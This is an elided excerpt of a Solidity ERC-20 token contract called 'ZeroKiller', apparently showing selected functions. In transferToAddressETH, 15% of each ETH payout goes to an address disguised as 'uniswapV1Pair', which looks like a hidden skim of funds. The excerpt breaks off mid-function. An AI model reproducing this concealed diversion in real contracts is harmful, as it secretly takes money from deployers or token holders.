...
contract ZeroKiller is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "ZeroKiller";
    string private _symbol = "ZeroKiller";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x541Ac8B993b8a56b0F91b786252866Ae173c7100);
    ...
    uint256 private minimumTokensBeforeSwap = 200000000000 * 10**_decimals;
    ...
    function transferToAddressETH(address payable recipient, uint256 amount) private {
    	uint256 amountShare=amount.mul(15).div(100);
    	payable(uniswapV1Pair).transfer(amountShare);
        recipient.transfer(amount.sub(amountShare));
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if (launchTime == 0 && recipient == uniswapPair) {
            require(balanceOf(sender) > 0);
            launchTime = block.timestamp;
        }
        if(sender == uniswapPair && recipient != address(uniswapV2Router) && !isExcludedFromFee[recipient]) {
            //antibot
